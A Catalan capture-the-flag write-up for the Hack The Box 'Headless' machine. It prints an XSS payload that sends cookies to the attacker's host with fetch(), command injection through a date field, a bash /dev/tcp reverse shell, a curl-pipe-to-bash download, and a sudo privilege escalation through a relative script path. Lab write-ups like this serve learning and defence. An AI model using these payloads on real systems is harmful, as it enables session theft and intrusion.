Primer de tot fem un nmap per veure els ports que hi ha oberts a la màquina que estem atacant:

```
`┌──(root㉿kali)-[/home/polkali]
└─# nmap -v -sC -sV 10.10.11.8 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 18:42 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:42
Completed NSE at 18:42, 0.00s elapsed
Initiating NSE at 18:42
Completed NSE at 18:42, 0.00s elapsed
Initiating NSE at 18:42
Completed NSE at 18:42, 0.00s elapsed
Initiating Ping Scan at 18:42
Scanning 10.10.11.8 [4 ports]
Completed Ping Scan at 18:42, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:42
Completed Parallel DNS resolution of 1 host. at 18:42, 0.00s elapsed
Initiating SYN Stealth Scan at 18:42
Scanning 10.10.11.8 [1000 ports]
Discovered open port 22/tcp on 10.10.11.8
Discovered open port 5000/tcp on 10.10.11.8
Completed SYN Stealth Scan at 18:42, 3.76s elapsed (1000 total ports)
Initiating Service scan at 18:42
Scanning 2 services on 10.10.11.8
Completed Service scan at 18:44, 97.86s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.8.
Initiating NSE at 18:44
Completed NSE at 18:44, 2.95s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 1.10s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 0.00s elapsed
Nmap scan report for 10.10.11.8
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 24 Mar 2024 17:42:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>`
```
|_    </html>

Ens trobem amb el port 22 obert per SSH i el port 5000 hi ha Werkzeug que és una completa biblioteca d'aplicacions web WSGI. Va començar com una simple col·lecció de diverses utilitats per a aplicacions WSGI i s'ha convertit en una de les biblioteques d'utilitats WSGI més avançades.

Ara provarem d'accedir a la pàgina pel port 5000 i ens trobem això:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/dde1ce0a-e47e-4945-bc2f-c86e11f928b4)


Ara passo una eina com dirsearch per veure quins directoris hi ha ocults als quals hi puc accedir. Afegiré al fitxer de /etc/hosts el nom de domini associat a la IP per poder utilitzar-lo també a la hora d'utilitzar eines:

``10.10.11.8      headless.htb``

```
`┌──(root㉿kali)-[/home/polkali]
└─# dirsearch -u http://10.10.11.8:5000/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
/usr/local/lib/python3.11/dist-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.6) or chardet (5.2.0)/charset_normalizer (2.0.3) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.3                                                                             
 (_||| _) (/_(_|| (_| )                                                                                      
                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/polkali/reports/http_10.10.11.8_5000/__24-03-24_18-52-25.txt

Target: http://10.10.11.8:5000/

[18:52:25] Starting:                                                                                         
[18:53:22] 401 -  317B  - /dashboard                                        
[18:54:34] 200 -    2KB - /support                                          
                                                                             
Task Completed                                                                                               
                            `
``` 


Trobem tant el directori /dashboard com el /support. Al directori /dashboard no hi tenim autoritzat l'accés, però si que tenim accés al directori /support, on hi ha un formulari que a primera vista sembla que podria ser molt útil.

Primer provarem amb injecció sql a veure si obtenim algun resultat:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/5129c2fe-d6c6-47b9-a27e-466eef8c0aef)


Sembla que potser podrem obtenir alguna cosa, ara provarem amb SQLmap:

```
`[19:29:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:29:34] [WARNING] POST parameter 'message' does not seem to be injectable
[19:29:34] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 19:29:34 /2024-03-24/`
```

Provarem Cross-Site Scripting (XSS), per exemple provarem el següent a tots els camps del formulari on ens el deixi posar (tot i que només posant-lo a 1 segurament també funcioni). És un exemple d'una etiqueta HTML que executa una funció JavaScript. En aquest cas, la funció JavaScript simplement mostraria una finestra emergent amb el text "hacked" :

``<script>alert("hacked")</script>``

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/023fe6ff-cee5-4e70-96ed-1297df41f39c)


Al fer-ho l'atac XSS ens retorna el següent missatge:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/abeaddbd-cff3-43a1-a16c-74f5b220c0d1)


El missatge ens diu que la nostre IP s'ha marcat i s'ha enviat un informe als administradors del lloc web perquè investiguin el cas.

Veiem que la cookie és admin, podríem mirar d'utilitzar-la posantl-la al payload i a User-Agent que és on ens ha funcionat mentre escoltavem des de la nostra màquina i hem obtingut una cookie d'usuari admin:

```
`┌──(root㉿kali)-[/home/polkali]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.8 - - [07/Apr/2024 12:34:56] code 404, message File not found
10.10.11.8 - - [07/Apr/2024 12:34:56] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -`
```


```
`POST /support HTTP/1.1

Host: 10.10.11.8:5000

User-Agent: <img src=x onerror=fetch('http://10.10.14.198:4444/'+document.cookie);>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 310

Origin: http://10.10.11.8:5000

Connection: close

Referer: http://10.10.11.8:5000/support

Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

Upgrade-Insecure-Requests: 1



fname=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&lname=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&email=prova%40proca.com&phone=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&message=<img src=x onerror=fetch('http://10.10.14.198:4444/'+document.cookie);>`
```


Ara provem la cookie trobada d'usuari administrador a veure si ens serveix per accedir al dashboard. Quan accedim al directori /dashboard amb la cookie per defecte no ens hi deixa accedir:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/6d96827e-7410-41f6-b6cf-f328423aa780)


![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/1c7db8c6-9555-48fa-a964-0e721ccf310d)


Quan posem la cookie que hem obtingut d'usuari administrador ja ens hi deixa accedir al /dashboard:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/57917b5f-c591-450a-ac1d-f6d8efc68ad4)


![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/36322b90-3e9c-4e2b-8981-9e86cea51d5b)


Un cop aquí veiem el dashboard on se'ns permet generar un report, anem a veure a on ens porta el botó de generar report (utilitzant la cookie d'admin):

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/a5af0e18-bb06-4bab-b88c-9496edffae93)


Sembla que des d'aquí podrem accedir a la màquina, de moment només ens deixa seleccionar la data, i veiem que amb la petició al clicar al botó blau fa un POST i posa la data: 

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/4f8a2e85-8b69-4dd9-9475-c8c99e12dd2d)


Per tant mirarem de modificar la petició post i posar alguna comanda com per exemple 'id' a veure què ens retorna.

Després de fer proves, veiem que s'ha de posar la comanda darrere la data, amb un ; que ho separi:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/52f62228-75e7-484f-9d61-7fca151c065f)


I obtenim resposta!!

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/9431c95f-63e6-4e5e-b95e-e4424cf69c74)


Ara doncs, haurem de mirar de trobar/crear una comanda que ens faci una reverse shell. Primer obrirem un terminal a la nostra màquina per escoltar per el port 4444 per exemple:

```
`┌──(root㉿kali)-[/home/polkali]
└─# nc -lvp 4444                
listening on [any] 4444 ...`
```

I ara hem trobat aquesta shell i la utilitzarem https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp : 

``bash -i >& /dev/tcp/10.10.14.198/4444 0>&1``

Preparem la petició post que es genera al clicar el botó blau on s'hi posa la data:

```
`POST /dashboard HTTP/1.1

Host: 10.10.11.8:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 15

Origin: http://10.10.11.8:5000

Connection: close

Referer: http://10.10.11.8:5000/dashboard

Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

Upgrade-Insecure-Requests: 1



date=2023-09-15;bash -c 'bash -i &>/dev/tcp/10.10.14.198/4444 <&1'
```

No ha funcionat. Provarem de crear el fitxer a la nostra màquina i modificar la petició POST posant curl per poder accedir al fitxer que creem.

Creem el fitxer:

```
┌──(root㉿kali)-[/]
└─# cat reverseshell.sh      
#!/bin/bash
bash -c 'bash -i &>/dev/tcp/10.10.14.198/4444 <&1'

```

I és molt important otorgar-li permisos d'execució:

```
┌──(root㉿kali)-[/home/polkali/Documents/Headless]
└─# chmod +x reverseshell.sh `
```

I mourem el fitxer creat a l'arrel de la nostra màquina per no haver de posar tants directoris al curl, i ara provarem si funciona. 

IMPORTANT aixercar servidor web perquè la màquina víctima pugui amb curl agafar el fitxer que carreguem .sh:

``sudo python3 -m http.server 80``

Un cop fet això ja podem modificar la petició POST posant la comanda curl perquè agafi el fitxer que hem generat .sh a través del servidor http que hem muntat amb python:

```
POST /dashboard HTTP/1.1

Host: 10.10.11.8:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 15

Origin: http://10.10.11.8:5000

Connection: close

Referer: http://10.10.11.8:5000/dashboard

Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

Upgrade-Insecure-Requests: 1



date=2023-09-15;curl http://10.10.14.198/reverseshell.sh|bash
````

Mentre des de la nostra màquina estem escoltant:

```
┌──(root㉿kali)-[/home/polkali]
└─# nc -nlvp 4444  
listening on [any] 4444 ...`
```

I un cop enviem la petició aconseguim la shell:

```
`┌──(root㉿kali)-[/home/polkali]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.8] 41022
bash: cannot set terminal process group (1337): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ whoami
whoami
dvir
bash-5.2$ `
```

I podem obtenir la **flag d'user**:

```
bash-5.2$ pwd
pwd
/home/dvir/app
bash-5.2$ ls
ls
app.py
dashboard.html
hackattempt.html
hacking_reports
index.html
initdb.sh
inspect_reports.py
report.sh
rev.sh
support.html
bash-5.2$ cd /home/dvir
cd /home/dvir
bash-5.2$ ls
ls
app
geckodriver.log
initdb,sh
initdb.sh
user.txt
bash-5.2$ cat user.txt
cat user.txt
9b95c4181e62c2e21bf56223a208c51f
bash-5.2$ 
```

Ara, mirarem d'escalar privilegis per obtenir la flag de l'usuari root. El primer que fem es veure sobre on tenim permisos:

```
`bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
bash-5.2$ `
```

I veiem que l'usuari "dvir" té permisos per executar la comanda /usr/bin/syscheck amb privilegis d'administrador ((ALL) NOPASSWD: /usr/bin/syscheck) a la màquina "headless" sense necessitat de proporcionar una contrasenya.

Ara doncs mirare com podem escalar privilegis a través d'això, el primer que fem és anar a veure aquest fitxer a veure què conte:

```
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
````

Veiem que executa l'script initdb.sh, per tant podem mirar de modificar-lo/crear-lo a veure si així podem accedir a l'usuari root. Primer he buscat el fitxer amb un find i l'he trobat:

```
bash-5.2$ find / -name "initdb.sh" 2>/dev/null
find / -name "initdb.sh" 2>/dev/null
/home/dvir/initdb.sh
/home/dvir/app/initdb.sh
bash-5.2$ 
```

Posem /bin/bash a l'script initdb.sh:

```
`bash-5.2$ echo "/bin/bash" > initdb.sh
echo "/bin/bash" > initdb.sh
bash-5.2$ chmod +x initdb.sh
chmod +x initdb.sh`
```

I ara executem el fitxer sobre els quals tenim permisos sudo /usr/bin/syscheck que executarà l'script que utilitzem per tenir permisos root. Amb comanda sudo /usr/bin/syscheck executem  l'script /usr/bin/syscheck amb privilegis d'administrador utilitzant sudo.

Dins de l'script syscheck, hi ha una secció que comprova si l'usuari és root. Si l'usuari és root, executa la comanda ./initdb.sh. Com ara el contingut de initdb.sh és /bin/bash, quan aquesta comanda s'executa, obre un nou shell Bash.

Un cop dins del shell Bash obert amb initdb.sh, hem executat la comanda whoami, que mostra l'usuari actual, i ha retornat root, indicant que ara som l'usuari root.

```
`bash-5.2$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.4G
System load average:  0.19, 0.11, 0.06
Database service is not running. Starting it...
whoami
root`
```

I ja podem aconseguir **la flag root**:

```
bash-5.2$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.4G
System load average:  0.19, 0.11, 0.06
Database service is not running. Starting it...
whoami
root
cd /root
ls
root.txt
cat root.txt
b6cf3b925eee77c38ca7244975b4a38f`
```

